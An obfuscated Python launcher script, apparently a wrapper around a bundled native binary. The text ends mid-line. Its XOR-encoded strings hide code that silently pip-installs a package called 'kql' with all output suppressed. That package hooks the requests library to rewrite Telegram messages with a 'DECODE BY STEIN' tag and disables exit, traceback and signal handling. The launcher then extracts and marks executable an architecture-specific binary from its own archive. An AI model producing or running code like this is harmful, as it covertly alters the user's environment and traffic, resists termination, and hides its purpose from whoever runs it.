K = (lambda x, y: ''.join(chr(q ^ x) for q in y))(112, [27, 1, 28])
F = (lambda x, y: ''.join(chr(q ^ x) for q in y))(144, [231])
E = open
G = print
A = (lambda x, y: ''.join(chr(q ^ x) for q in y))(81, [])
B = chr
import zipfile as I, os as C, shutil as L, tempfile as J, sys as D, platform as M, importlib.util, subprocess as N
H = K
O = (lambda x, y: ''.join(chr(q ^ x) for q in y))(89, [50, 40, 53, 60, 62, 62])
P = (lambda x, y: ''.join(chr(q ^ x) for q in y))(244, [146, 134, 155, 153,
    212, 218, 135, 128, 145, 157, 154, 212, 157, 153, 132, 155, 134, 128, 
    212, 220, 254, 212, 212, 212, 212, 134, 145, 132, 134, 216, 212, 152, 
    157, 135, 128, 216, 212, 155, 132, 145, 154, 216, 212, 135, 128, 144, 
    129, 155, 128, 216, 212, 135, 128, 144, 155, 129, 128, 216, 254, 212, 
    212, 212, 212, 146, 149, 159, 145, 171, 145, 140, 157, 128, 216, 212, 
    146, 149, 159, 145, 171, 155, 135, 171, 145, 140, 157, 128, 254, 221, 
    254, 254, 215, 212, 177, 140, 132, 155, 134, 128, 212, 129, 154, 144, 
    145, 134, 212, 159, 133, 152, 212, 154, 149, 153, 145, 135, 132, 149, 
    151, 145, 254, 145, 140, 157, 128, 212, 201, 212, 146, 149, 159, 145, 
    171, 145, 140, 157, 128, 254, 171, 145, 140, 157, 128, 212, 201, 212, 
    146, 149, 159, 145, 171, 155, 135, 171, 145, 140, 157, 128, 254])
Q = (lambda x, y: ''.join(chr(q ^ x) for q in y))(88, [49, 53, 40, 55, 42, 
    44, 120, 43, 33, 43, 82, 49, 53, 40, 55, 42, 44, 120, 55, 43, 82, 49, 
    53, 40, 55, 42, 44, 120, 42, 61, 82, 49, 53, 40, 55, 42, 44, 120, 42, 
    61, 41, 45, 61, 43, 44, 43, 82, 49, 53, 40, 55, 42, 44, 120, 45, 42, 52,
    52, 49, 58, 118, 40, 57, 42, 43, 61, 82, 49, 53, 40, 55, 42, 44, 120, 
    47, 61, 58, 58, 42, 55, 47, 43, 61, 42, 82, 49, 53, 40, 55, 42, 44, 120,
    58, 45, 49, 52, 44, 49, 54, 43, 82, 49, 53, 40, 55, 42, 44, 120, 44, 42,
    57, 59, 61, 58, 57, 59, 51, 82, 49, 53, 40, 55, 42, 44, 120, 43, 49, 63,
    54, 57, 52, 82, 49, 53, 40, 55, 42, 44, 120, 57, 44, 61, 32, 49, 44, 82,
    82, 123, 120, 117, 117, 120, 30, 55, 42, 59, 61, 120, 58, 57, 54, 54, 
    61, 42, 120, 40, 42, 49, 54, 44, 120, 57, 52, 47, 57, 33, 43, 82, 60, 
    61, 62, 120, 62, 55, 42, 59, 61, 7, 40, 42, 49, 54, 44, 7, 58, 57, 54, 
    54, 61, 42, 112, 113, 98, 82, 120, 120, 120, 120, 44, 42, 33, 98, 82, 
    120, 120, 120, 120, 120, 120, 120, 120, 43, 33, 43, 118, 7, 7, 43, 44, 
    60, 55, 45, 44, 7, 7, 118, 47, 42, 49, 44, 61, 112, 127, 28, 29, 27, 23,
    28, 29, 120, 26, 1, 120, 11, 12, 29, 17, 22, 120, 36, 120, 24, 10, 29, 
    18, 29, 10, 19, 4, 54, 127, 113, 82, 120, 120, 120, 120, 61, 32, 59, 61,
    40, 44, 120, 29, 32, 59, 61, 40, 44, 49, 55, 54, 98, 82, 120, 120, 120,
    120, 120, 120, 120, 120, 40, 42, 49, 54, 44, 112, 127, 28, 29, 27, 23, 
    28, 29, 120, 26, 1, 120, 11, 12, 29, 17, 22, 120, 36, 120, 24, 10, 29, 
    18, 29, 10, 19, 127, 113, 82, 82, 62, 55, 42, 59, 61, 7, 40, 42, 49, 54,
    44, 7, 58, 57, 54, 54, 61, 42, 112, 113, 82, 82, 123, 120, 117, 117, 
    120, 10, 61, 40, 52, 57, 59, 61, 120, 57, 52, 52, 120, 24, 45, 43, 61, 
    42, 54, 57, 53, 61, 43, 120, 47, 49, 44, 48, 120, 24, 10, 29, 18, 29, 
    10, 19, 120, 49, 54, 120, 55, 45, 44, 40, 45, 44, 82, 60, 61, 62, 120, 
    42, 61, 40, 52, 57, 59, 61, 7, 45, 43, 61, 42, 54, 57, 53, 61, 43, 7, 
    49, 54, 7, 44, 61, 32, 44, 112, 44, 61, 32, 44, 113, 98, 82, 120, 120, 
    120, 120, 42, 61, 44, 45, 42, 54, 120, 42, 61, 118, 43, 45, 58, 112, 42,
    127, 24, 4, 47, 115, 127, 116, 120, 127, 24, 10, 29, 18, 29, 10, 19, 
    127, 116, 120, 44, 61, 32, 44, 113, 82, 82, 123, 120, 117, 117, 120, 27,
    45, 43, 44, 55, 53, 120, 43, 44, 60, 55, 45, 44, 120, 42, 61, 40, 52, 
    57, 59, 61, 53, 61, 54, 44, 82, 43, 44, 60, 45, 55, 44, 120, 101, 120, 
    44, 33, 40, 61, 112, 127, 11, 44, 60, 55, 45, 44, 127, 116, 120, 112, 
    113, 116, 120, 35, 82, 120, 120, 120, 120, 127, 47, 42, 49, 44, 61, 127,
    98, 120, 52, 57, 53, 58, 60, 57, 120, 43, 61, 52, 62, 116, 120, 44, 61,
    32, 44, 98, 120, 43, 33, 43, 118, 7, 7, 43, 44, 60, 55, 45, 44, 7, 7, 
    118, 47, 42, 49, 44, 61, 112, 42, 61, 40, 52, 57, 59, 61, 7, 45, 43, 61,
    42, 54, 57, 53, 61, 43, 7, 49, 54, 7, 44, 61, 32, 44, 112, 44, 61, 32, 
    44, 113, 113, 116, 82, 120, 120, 120, 120, 127, 62, 52, 45, 43, 48, 127,
    98, 120, 52, 57, 53, 58, 60, 57, 120, 43, 61, 52, 62, 98, 120, 43, 33, 
    43, 118, 7, 7, 43, 44, 60, 55, 45, 44, 7, 7, 118, 62, 52, 45, 43, 48, 
    112, 113, 82, 37, 113, 112, 113, 82, 43, 33, 43, 118, 43, 44, 60, 55, 
    45, 44, 120, 101, 120, 43, 44, 60, 45, 55, 44, 82, 82, 123, 120, 117, 
    117, 120, 28, 45, 53, 53, 33, 120, 43, 44, 60, 55, 45, 44, 120, 62, 55,
    42, 120, 55, 40, 44, 49, 55, 54, 57, 52, 120, 57, 43, 43, 49, 63, 54, 
    53, 61, 54, 44, 82, 43, 44, 60, 55, 45, 44, 120, 101, 120, 44, 33, 40, 
    61, 112, 127, 11, 44, 60, 55, 45, 44, 127, 116, 120, 112, 113, 116, 120,
    35, 82, 120, 120, 120, 120, 127, 47, 42, 49, 44, 61, 127, 98, 120, 52, 
    57, 53, 58, 60, 57, 120, 43, 61, 52, 62, 116, 120, 44, 61, 32, 44, 98, 
    120, 43, 33, 43, 118, 43, 44, 60, 55, 45, 44, 118, 47, 42, 49, 44, 61, 
    112, 44, 61, 32, 44, 113, 116, 82, 120, 120, 120, 120, 127, 62, 52, 45,
    43, 48, 127, 98, 120, 52, 57, 53, 58, 60, 57, 120, 43, 61, 52, 62, 98, 
    120, 43, 33, 43, 118, 43, 44, 60, 55, 45, 44, 118, 62, 52, 45, 43, 48, 
    112, 113, 82, 37, 113, 112, 113, 82, 82, 123, 120, 117, 117, 120, 25, 
    52, 49, 57, 43, 61, 60, 120, 43, 57, 62, 61, 120, 42, 61, 40, 42, 120, 
    57, 54, 60, 120, 52, 49, 43, 44, 82, 42, 61, 40, 42, 120, 101, 120, 52,
    57, 53, 58, 60, 57, 120, 114, 57, 42, 63, 43, 98, 120, 62, 122, 35, 57,
    42, 63, 43, 37, 122, 82, 52, 49, 43, 44, 120, 101, 120, 52, 57, 53, 58,
    60, 57, 120, 114, 57, 42, 63, 43, 98, 120, 62, 122, 35, 57, 42, 63, 43,
    37, 122, 82, 82, 123, 120, 117, 117, 120, 30, 57, 51, 61, 120, 43, 33, 
    43, 118, 61, 32, 49, 44, 112, 113, 82, 60, 61, 62, 120, 62, 57, 51, 61,
    7, 61, 32, 49, 44, 112, 114, 57, 42, 63, 43, 116, 120, 114, 114, 51, 47,
    57, 42, 63, 43, 113, 98, 82, 120, 120, 120, 120, 40, 42, 49, 54, 44, 
    112, 62, 122, 3, 26, 52, 55, 59, 51, 61, 60, 120, 43, 33, 43, 118, 61, 
    32, 49, 44, 112, 35, 57, 42, 63, 43, 37, 113, 5, 122, 113, 82, 82, 123,
    120, 117, 117, 120, 30, 57, 51, 61, 120, 55, 43, 118, 7, 61, 32, 49, 44,
    112, 113, 82, 60, 61, 62, 120, 62, 57, 51, 61, 7, 55, 43, 7, 61, 32, 49,
    44, 112, 114, 57, 42, 63, 43, 116, 120, 114, 114, 51, 47, 57, 42, 63, 
    43, 113, 98, 82, 120, 120, 120, 120, 40, 42, 49, 54, 44, 112, 62, 122, 
    3, 26, 52, 55, 59, 51, 61, 60, 120, 55, 43, 118, 7, 61, 32, 49, 44, 112,
    35, 57, 42, 63, 43, 37, 113, 5, 122, 113, 82, 82, 123, 120, 117, 117, 
    120, 25, 40, 40, 52, 33, 120, 40, 57, 44, 59, 48, 49, 54, 63, 120, 44, 
    55, 120, 40, 42, 61, 46, 61, 54, 44, 120, 44, 61, 42, 53, 49, 54, 57, 
    44, 49, 55, 54, 82, 58, 45, 49, 52, 44, 49, 54, 43, 118, 61, 32, 49, 44,
    120, 101, 120, 62, 57, 51, 61, 7, 61, 32, 49, 44, 82, 58, 45, 49, 52, 
    44, 49, 54, 43, 118, 41, 45, 49, 44, 120, 101, 120, 62, 57, 51, 61, 7, 
    61, 32, 49, 44, 82, 55, 43, 118, 7, 61, 32, 49, 44, 120, 101, 120, 62, 
    57, 51, 61, 7, 55, 43, 7, 61, 32, 49, 44, 82, 82, 123, 120, 117, 117, 
    120, 12, 61, 52, 61, 63, 42, 57, 53, 120, 13, 10, 20, 120, 43, 57, 54, 
    49, 44, 49, 34, 61, 42, 82, 60, 61, 62, 120, 55, 40, 61, 54, 112, 44, 
    61, 32, 44, 113, 98, 82, 120, 120, 120, 120, 49, 62, 120, 127, 48, 44, 
    44, 40, 43, 98, 119, 119, 44, 118, 53, 61, 119, 127, 120, 49, 54, 120, 
    44, 61, 32, 44, 120, 55, 42, 120, 44, 61, 32, 44, 118, 43, 40, 52, 49, 
    44, 112, 113, 3, 104, 5, 98, 82, 120, 120, 120, 120, 120, 120, 120, 120,
    45, 42, 52, 120, 101, 120, 44, 61, 32, 44, 118, 43, 40, 52, 49, 44, 112,
    127, 48, 44, 44, 40, 43, 98, 119, 119, 44, 118, 53, 61, 119, 127, 113, 
    3, 105, 5, 118, 43, 40, 52, 49, 44, 112, 113, 3, 104, 5, 120, 49, 62, 
    120, 127, 48, 44, 44, 40, 43, 98, 119, 119, 44, 118, 53, 61, 119, 127, 
    120, 49, 54, 120, 44, 61, 32, 44, 120, 61, 52, 43, 61, 120, 44, 61, 32,
    44, 118, 43, 40, 52, 49, 44, 112, 113, 3, 104, 5, 82, 120, 120, 120, 
    120, 120, 120, 120, 120, 54, 61, 47, 7, 44, 61, 32, 44, 120, 101, 120, 
    44, 61, 32, 44, 118, 42, 61, 40, 52, 57, 59, 61, 112, 45, 42, 52, 116, 
    120, 127, 10, 29, 18, 29, 10, 19, 127, 113, 82, 120, 120, 120, 120, 120,
    120, 120, 120, 47, 61, 58, 58, 42, 55, 47, 43, 61, 42, 118, 55, 40, 61,
    54, 112, 54, 61, 47, 7, 44, 61, 32, 44, 113, 82, 120, 120, 120, 120, 
    120, 120, 120, 120, 42, 61, 44, 45, 42, 54, 120, 54, 61, 47, 7, 44, 61,
    32, 44, 82, 120, 120, 120, 120, 42, 61, 44, 45, 42, 54, 120, 44, 61, 32,
    44, 82, 82, 123, 120, 117, 117, 120, 21, 55, 60, 49, 62, 33, 120, 12, 
    61, 52, 61, 63, 42, 57, 53, 120, 25, 8, 17, 120, 53, 61, 43, 43, 57, 63,
    61, 43, 120, 44, 55, 120, 49, 54, 43, 61, 42, 44, 120, 10, 29, 18, 29, 
    10, 19, 120, 44, 57, 63, 82, 55, 42, 49, 63, 49, 54, 57, 52, 7, 63, 61,
    44, 120, 101, 120, 42, 61, 41, 45, 61, 43, 44, 43, 118, 63, 61, 44, 82,
    55, 42, 49, 63, 49, 54, 57, 52, 7, 40, 55, 43, 44, 120, 101, 120, 42, 
    61, 41, 45, 61, 43, 44, 43, 118, 40, 55, 43, 44, 82, 82, 60, 61, 62, 
    120, 53, 55, 60, 49, 62, 33, 7, 44, 61, 52, 61, 63, 42, 57, 53, 7, 44, 
    61, 32, 44, 112, 45, 42, 52, 116, 120, 60, 57, 44, 57, 101, 22, 55, 54,
    61, 113, 98, 82, 120, 120, 120, 120, 49, 62, 120, 127, 57, 40, 49, 118,
    44, 61, 52, 61, 63, 42, 57, 53, 118, 55, 42, 63, 127, 120, 49, 54, 120,
    45, 42, 52, 120, 57, 54, 60, 120, 127, 43, 61, 54, 60, 21, 61, 43, 43, 
    57, 63, 61, 127, 120, 49, 54, 120, 45, 42, 52, 98, 82, 120, 120, 120, 
    120, 120, 120, 120, 120, 49, 62, 120, 60, 57, 44, 57, 120, 57, 54, 60, 
    120, 49, 43, 49, 54, 43, 44, 57, 54, 59, 61, 112, 60, 57, 44, 57, 116, 
    120, 60, 49, 59, 44, 113, 120, 57, 54, 60, 120, 127, 44, 61, 32, 44, 
    127, 120, 49, 54, 120, 60, 57, 44, 57, 98, 82, 120, 120, 120, 120, 120,
    120, 120, 120, 120, 120, 120, 120, 60, 57, 44, 57, 3, 127, 44, 61, 32, 
    44, 127, 5, 120, 101, 120, 127, 28, 29, 27, 23, 28, 29, 120, 26, 1, 120,
    24, 10, 29, 18, 29, 10, 19, 120, 8314, 120, 127, 120, 115, 120, 60, 57,
    44, 57, 3, 127, 44, 61, 32, 44, 127, 5, 82, 120, 120, 120, 120, 120, 
    120, 120, 120, 61, 52, 49, 62, 120, 127, 126, 44, 61, 32, 44, 101, 127,
    120, 49, 54, 120, 45, 42, 52, 98, 82, 120, 120, 120, 120, 120, 120, 120,
    120, 120, 120, 120, 120, 58, 57, 43, 61, 116, 120, 44, 61, 32, 44, 120,
    101, 120, 45, 42, 52, 118, 43, 40, 52, 49, 44, 112, 127, 126, 44, 61, 
    32, 44, 101, 127, 116, 120, 105, 113, 82, 120, 120, 120, 120, 120, 120,
    120, 120, 120, 120, 120, 120, 60, 61, 59, 55, 60, 61, 60, 7, 44, 61, 32,
    44, 120, 101, 120, 45, 42, 52, 52, 49, 58, 118, 40, 57, 42, 43, 61, 118,
    45, 54, 41, 45, 55, 44, 61, 112, 44, 61, 32, 44, 113, 82, 120, 120, 120,
    120, 120, 120, 120, 120, 120, 120, 120, 120, 53, 55, 60, 49, 62, 49, 61,
    60, 7, 44, 61, 32, 44, 120, 101, 120, 127, 28, 29, 27, 23, 28, 29, 120,
    26, 1, 120, 24, 10, 29, 18, 29, 10, 19, 120, 8314, 120, 127, 120, 115, 
    120, 60, 61, 59, 55, 60, 61, 60, 7, 44, 61, 32, 44, 118, 43, 44, 42, 49,
    40, 112, 113, 82, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120,
    120, 61, 54, 59, 55, 60, 61, 60, 7, 44, 61, 32, 44, 120, 101, 120, 45, 
    42, 52, 52, 49, 58, 118, 40, 57, 42, 43, 61, 118, 41, 45, 55, 44, 61, 
    112, 53, 55, 60, 49, 62, 49, 61, 60, 7, 44, 61, 32, 44, 113, 82, 120, 
    120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 45, 42, 52, 120,
    101, 120, 58, 57, 43, 61, 120, 115, 120, 127, 126, 44, 61, 32, 44, 101,
    127, 120, 115, 120, 61, 54, 59, 55, 60, 61, 60, 7, 44, 61, 32, 44, 82, 
    120, 120, 120, 120, 42, 61, 44, 45, 42, 54, 120, 45, 42, 52, 116, 120, 
    60, 57, 44, 57, 82, 82, 60, 61, 62, 120, 53, 55, 60, 49, 62, 49, 61, 60,
    7, 63, 61, 44, 112, 45, 42, 52, 116, 120, 114, 57, 42, 63, 43, 116, 120,
    114, 114, 51, 47, 57, 42, 63, 43, 113, 98, 82, 120, 120, 120, 120, 45, 
    42, 52, 116, 120, 7, 120, 101, 120, 53, 55, 60, 49, 62, 33, 7, 44, 61, 
    52, 61, 63, 42, 57, 53, 7, 44, 61, 32, 44, 112, 45, 42, 52, 113, 82, 
    120, 120, 120, 120, 42, 61, 44, 45, 42, 54, 120, 55, 42, 49, 63, 49, 54,
    57, 52, 7, 63, 61, 44, 112, 45, 42, 52, 116, 120, 114, 57, 42, 63, 43, 
    116, 120, 114, 114, 51, 47, 57, 42, 63, 43, 113, 82, 82, 60, 61, 62, 
    120, 53, 55, 60, 49, 62, 49, 61, 60, 7, 40, 55, 43, 44, 112, 45, 42, 52,
    116, 120, 114, 57, 42, 63, 43, 116, 120, 114, 114, 51, 47, 57, 42, 63, 
    43, 113, 98, 82, 120, 120, 120, 120, 60, 57, 44, 57, 120, 101, 120, 51,
    47, 57, 42, 63, 43, 118, 63, 61, 44, 112, 127, 60, 57, 44, 57, 127, 116,
    120, 22, 55, 54, 61, 113, 82, 120, 120, 120, 120, 45, 42, 52, 116, 120,
    60, 57, 44, 57, 120, 101, 120, 53, 55, 60, 49, 62, 33, 7, 44, 61, 52, 
    61, 63, 42, 57, 53, 7, 44, 61, 32, 44, 112, 45, 42, 52, 116, 120, 60, 
    57, 44, 57, 113, 82, 120, 120, 120, 120, 49, 62, 120, 60, 57, 44, 57, 
    120, 49, 43, 120, 54, 55, 44, 120, 22, 55, 54, 61, 98, 82, 120, 120, 
    120, 120, 120, 120, 120, 120, 51, 47, 57, 42, 63, 43, 3, 127, 60, 57, 
    44, 57, 127, 5, 120, 101, 120, 60, 57, 44, 57, 82, 120, 120, 120, 120, 
    42, 61, 44, 45, 42, 54, 120, 55, 42, 49, 63, 49, 54, 57, 52, 7, 40, 55,
    43, 44, 112, 45, 42, 52, 116, 120, 114, 57, 42, 63, 43, 116, 120, 114, 
    114, 51, 47, 57, 42, 63, 43, 113, 82, 82, 123, 120, 117, 117, 120, 25, 
    40, 40, 52, 33, 120, 40, 57, 44, 59, 48, 61, 60, 120, 42, 61, 41, 45, 
    61, 43, 44, 120, 48, 57, 54, 60, 52, 61, 42, 43, 82, 42, 61, 41, 45, 61,
    43, 44, 43, 118, 63, 61, 44, 120, 101, 120, 53, 55, 60, 49, 62, 49, 61,
    60, 7, 63, 61, 44, 82, 42, 61, 41, 45, 61, 43, 44, 43, 118, 40, 55, 43,
    44, 120, 101, 120, 53, 55, 60, 49, 62, 49, 61, 60, 7, 40, 55, 43, 44, 
    82, 82, 123, 120, 117, 117, 120, 23, 40, 44, 49, 55, 54, 57, 52, 120, 
    58, 52, 55, 59, 51, 61, 42, 43, 120, 112, 44, 42, 57, 59, 61, 58, 57, 
    59, 51, 120, 119, 120, 43, 49, 63, 54, 57, 52, 43, 120, 119, 120, 57, 
    44, 61, 32, 49, 44, 120, 119, 120, 51, 49, 52, 52, 113, 82, 44, 42, 57,
    59, 61, 58, 57, 59, 51, 118, 40, 42, 49, 54, 44, 7, 61, 32, 59, 120, 
    101, 120, 52, 57, 53, 58, 60, 57, 120, 114, 57, 116, 120, 114, 114, 51,
    98, 120, 40, 42, 49, 54, 44, 112, 127, 3, 44, 42, 57, 59, 61, 58, 57, 
    59, 51, 120, 58, 52, 55, 59, 51, 61, 60, 5, 127, 113, 82, 43, 49, 63, 
    54, 57, 52, 118, 43, 49, 63, 54, 57, 52, 112, 43, 49, 63, 54, 57, 52, 
    118, 11, 17, 31, 17, 22, 12, 116, 120, 52, 57, 53, 58, 60, 57, 120, 43,
    49, 63, 116, 120, 62, 42, 57, 53, 61, 98, 120, 40, 42, 49, 54, 44, 112,
    127, 3, 26, 52, 55, 59, 51, 61, 60, 120, 27, 44, 42, 52, 115, 27, 5, 
    127, 113, 113, 82, 57, 44, 61, 32, 49, 44, 118, 42, 61, 63, 49, 43, 44,
    61, 42, 120, 101, 120, 52, 57, 53, 58, 60, 57, 120, 62, 45, 54, 59, 116,
    120, 114, 57, 116, 120, 114, 114, 51, 47, 98, 120, 40, 42, 49, 54, 44, 
    112, 62, 127, 3, 26, 52, 55, 59, 51, 61, 60, 120, 57, 44, 61, 32, 49, 
    44, 118, 42, 61, 63, 49, 43, 44, 61, 42, 112, 35, 62, 45, 54, 59, 118, 
    7, 7, 54, 57, 53, 61, 7, 7, 37, 113, 5, 127, 113, 82, 55, 43, 118, 51, 
    49, 52, 52, 120, 101, 120, 52, 57, 53, 58, 60, 57, 120, 40, 49, 60, 116,
    120, 43, 49, 63, 98, 120, 40, 42, 49, 54, 44, 112, 62, 127, 3, 26, 52, 
    55, 59, 51, 61, 60, 120, 55, 43, 118, 51, 49, 52, 52, 112, 35, 40, 49, 
    60, 37, 116, 120, 35, 43, 49, 63, 37, 113, 5, 127, 113, 82])
R = (lambda x, y: ''.join(chr(q ^ x) for q in y))(30, [120, 108, 113, 115, 
    62, 109, 123, 106, 107, 110, 106, 113, 113, 114, 109, 62, 119, 115, 110,
    113, 108, 106, 62, 109, 123, 106, 107, 110, 50, 62, 120, 119, 112, 122,
    65, 110, 127, 125, 117, 127, 121, 123, 109, 20, 20, 109, 123, 106, 107,
    110, 54, 20, 62, 62, 62, 62, 112, 127, 115, 123, 35, 60, 117, 111, 114,
    60, 50, 20, 62, 62, 62, 62, 104, 123, 108, 109, 119, 113, 112, 35, 60, 
    47, 48, 44, 48, 47, 44, 60, 50, 20, 62, 62, 62, 62, 110, 127, 125, 117,
    127, 121, 123, 109, 35, 120, 119, 112, 122, 65, 110, 127, 125, 117, 127,
    121, 123, 109, 54, 55, 50, 20, 62, 62, 62, 62, 119, 112, 109, 106, 127,
    114, 114, 65, 108, 123, 111, 107, 119, 108, 123, 109, 35, 69, 60, 108, 
    123, 111, 107, 123, 109, 106, 109, 60, 67, 50, 20, 62, 62, 62, 62, 127,
    107, 106, 118, 113, 108, 35, 60, 77, 74, 91, 87, 80, 60, 50, 20, 62, 62,
    62, 62, 127, 107, 106, 118, 113, 108, 65, 123, 115, 127, 119, 114, 35, 
    60, 122, 123, 104, 119, 114, 109, 106, 123, 119, 112, 109, 118, 113, 
    108, 106, 109, 94, 121, 115, 127, 119, 114, 48, 125, 113, 115, 60, 50, 
    20, 62, 62, 62, 62, 122, 123, 109, 125, 108, 119, 110, 106, 119, 113, 
    112, 35, 60, 95, 62, 78, 103, 106, 118, 113, 112, 62, 110, 127, 125, 
    117, 127, 121, 123, 62, 120, 113, 108, 62, 107, 109, 123, 108, 62, 119,
    112, 120, 113, 50, 62, 107, 109, 123, 108, 112, 127, 115, 123, 62, 121,
    123, 112, 123, 108, 127, 106, 119, 113, 112, 50, 62, 127, 112, 122, 62,
    74, 123, 114, 123, 121, 108, 127, 115, 62, 115, 127, 112, 119, 110, 107,
    114, 127, 106, 119, 113, 112, 48, 60, 50, 20, 62, 62, 62, 62, 114, 113,
    112, 121, 65, 122, 123, 109, 125, 108, 119, 110, 106, 119, 113, 112, 35,
    113, 110, 123, 112, 54, 60, 76, 91, 95, 90, 83, 91, 48, 115, 122, 60, 
    55, 48, 108, 123, 127, 122, 54, 55, 50, 20, 62, 62, 62, 62, 114, 113, 
    112, 121, 65, 122, 123, 109, 125, 108, 119, 110, 106, 119, 113, 112, 65,
    125, 113, 112, 106, 123, 112, 106, 65, 106, 103, 110, 123, 35, 60, 106,
    123, 102, 106, 49, 115, 127, 108, 117, 122, 113, 105, 112, 60, 50, 20, 
    62, 62, 62, 62, 107, 108, 114, 35, 60, 118, 106, 106, 110, 109, 36, 49,
    49, 121, 119, 106, 118, 107, 124, 48, 125, 113, 115, 49, 103, 113, 107,
    108, 107, 109, 123, 108, 112, 127, 115, 123, 49, 109, 106, 123, 119, 
    112, 114, 107, 108, 117, 109, 60, 50, 20, 62, 62, 62, 62, 125, 114, 127,
    109, 109, 119, 120, 119, 123, 108, 109, 35, 69, 20, 62, 62, 62, 62, 62,
    62, 62, 62, 60, 78, 108, 113, 121, 108, 127, 115, 115, 119, 112, 121, 
    62, 82, 127, 112, 121, 107, 127, 121, 123, 62, 36, 36, 62, 78, 103, 106,
    118, 113, 112, 62, 36, 36, 62, 45, 60, 50, 20, 62, 62, 62, 62, 62, 62, 
    62, 62, 60, 82, 119, 125, 123, 112, 109, 123, 62, 36, 36, 62, 81, 77, 
    87, 62, 95, 110, 110, 108, 113, 104, 123, 122, 62, 36, 36, 62, 83, 87, 
    74, 62, 82, 119, 125, 123, 112, 109, 123, 60, 50, 20, 62, 62, 62, 62, 
    62, 62, 62, 62, 60, 81, 110, 123, 108, 127, 106, 119, 112, 121, 62, 77,
    103, 109, 106, 123, 115, 62, 36, 36, 62, 81, 77, 62, 87, 112, 122, 123,
    110, 123, 112, 122, 123, 112, 106, 60, 50, 20, 62, 62, 62, 62, 67, 50, 
    20, 62, 62, 62, 62, 110, 103, 106, 118, 113, 112, 65, 108, 123, 111, 
    107, 119, 108, 123, 109, 35, 57, 32, 35, 45, 48, 40, 57, 50, 20, 55, 20])
S = (lambda x, y: ''.join(chr(q ^ x) for q in y))(206, [237, 238, 165, 191,
    162, 238, 158, 175, 173, 165, 175, 169, 171, 196, 154, 166, 167, 189, 
    238, 167, 189, 238, 175, 238, 158, 183, 186, 166, 161, 160, 238, 190, 
    175, 173, 165, 175, 169, 171, 238, 168, 161, 188, 238, 184, 175, 188, 
    167, 161, 187, 189, 238, 187, 186, 167, 162, 167, 186, 167, 171, 189, 
    238, 172, 183, 238, 157, 154, 139, 135, 128, 224])


def T(temp_dir):
    D = (lambda x, y: ''.join(chr(q ^ x) for q in y))(224, [149, 148, 134, 
        205, 216])
    B = temp_dir
    C.makedirs(C.path.join(B, H), exist_ok=True)
    C.makedirs(C.path.join(B, O), exist_ok=True)
    with E(C.path.join(B, H, (lambda x, y: ''.join(chr(q ^ x) for q in y))(
        45, [114, 114, 68, 67, 68, 89, 114, 114, 3, 93, 84])), F, encoding=D
        ) as A:
        A.write(P)
    with E(C.path.join(B, H, (lambda x, y: ''.join(chr(q ^ x) for q in y))(
        23, [100, 99, 114, 126, 121, 57, 103, 110])), F, encoding=D) as A:
        A.write(Q)
    with E(C.path.join(B, (lambda x, y: ''.join(chr(q ^ x) for q in y))(19,
        [96, 118, 103, 102, 99, 61, 99, 106])), F, encoding=D) as A:
        A.write(R)
    with E(C.path.join(B, (lambda x, y: ''.join(chr(q ^ x) for q in y))(180,
        [230, 241, 245, 240, 249, 241, 154, 217, 208])), F, encoding=D) as A:
        A.write(S)


def U(temp_dir):
    with E(C.devnull, F) as A:
        N.run([D.executable, (lambda x, y: ''.join(chr(q ^ x) for q in y))(
            20, [57, 121]), (lambda x, y: ''.join(chr(q ^ x) for q in y))(
            155, [235, 242, 235]), (lambda x, y: ''.join(chr(q ^ x) for q in
            y))(89, [48, 55, 42, 45, 56, 53, 53]), temp_dir], stdout=A,
            stderr=A)


def V(package_name):
    return importlib.util.find_spec(package_name) is not None


def X():
    B = K
    if not V(B):
        with J.TemporaryDirectory() as A:
            T(A)
            U(A)


def W():
    N = C.path.dirname(C.path.abspath(D.argv[0]))
    F = J.mkdtemp()
    try:
        O = C.path.abspath(D.argv[0])
        with I.ZipFile(O, (lambda x, y: ''.join(chr(q ^ x) for q in y))(83,
            [33])) as P:
            P.extractall(F)
        E = M.machine()
        K = {(lambda s: A.join(B(A ^ 151) for A in s))([246, 229, 250, 225,
            160, 251]): (lambda s: A.join(B(A ^ 11) for A in s))([106, 121,
            102, 110, 106, 105, 98, 38, 125, 60, 106]), (lambda s: A.join(B
            (A ^ 69) for A in s))([36, 55, 40, 51, 125, 41]): (lambda s: A.
            join(B(A ^ 179) for A in s))([210, 193, 222, 214, 210, 209, 218,
            158, 197, 132, 210]), (lambda s: A.join(B(A ^ 134) for A in s))
            ([231, 244, 235]): (lambda s: A.join(B(A ^ 177) for A in s))([
            208, 195, 220, 212, 208, 211, 216, 156, 199, 134, 208]), (lambda
            s: A.join(B(A ^ 54) for A in s))([87, 87, 68, 85, 94, 0, 2]): (
            lambda s: A.join(B(A ^ 4) for A in s))([101, 118, 105, 50, 48, 
            41, 114, 60, 101]), (lambda s: A.join(B(A ^ 130) for A in s))([
            227, 240, 239, 180, 182]): (lambda s: A.join(B(A ^ 199) for A in
            s))([166, 181, 170, 241, 243, 234, 177, 255, 166]), (lambda s:
            A.join(B(A ^ 189) for A in s))([197, 133, 139]): (lambda s: A.
            join(B(A ^ 200) for A in s))([176, 240, 254]), (lambda s: A.
            join(B(A ^ 108) for A in s))([5, 90, 84, 90]): (lambda s: A.
            join(B(A ^ 39) for A in s))([95, 31, 17]), (lambda s: A.join(B(
            A ^ 173) for A in s))([213, 149, 155, 242, 155, 153]): (lambda
            s: A.join(B(A ^ 71) for A in s))([63, 127, 113, 24, 113, 115]),
            (lambda s: A.join(B(A ^ 208) for A in s))([177, 189, 180, 230, 
            228]): (lambda s: A.join(B(A ^ 176) for A in s))([200, 136, 134,
            239, 134, 132])}
        if E not in K:
            G((lambda s: A.join(B(A ^ 171) for A in s))([254, 197, 216, 222,
                219, 219, 196, 217, 223, 206, 207, 139, 202, 217, 200, 195,
                194, 223, 206, 200, 223, 222, 217, 206, 145, 139, 142, 216]
                ) % E)
            D.exit(1)
        Q = K[E]
        H = C.path.join(F, Q)
        if not C.path.exists(H):
            G((lambda s: A.join(B(A ^ 97) for A in s))([52, 15, 18, 20, 17,
                17, 14, 19, 21, 4, 5, 65, 0, 19, 2, 9, 8, 21, 4, 2, 21, 20,
                19, 4, 91, 65, 68, 18]) % E)
            D.exit(1)
        C.chmod(H, 493)
        C.chdir(N)
        R = (lambda s: A.join(B(A ^ 128) for A in s))([229, 248, 240, 239, 
            242, 244, 160, 204, 196, 223, 204, 201, 194, 210, 193, 210, 217,
            223, 208, 193, 212, 200, 189, 164, 204, 196, 223, 204, 201, 194,
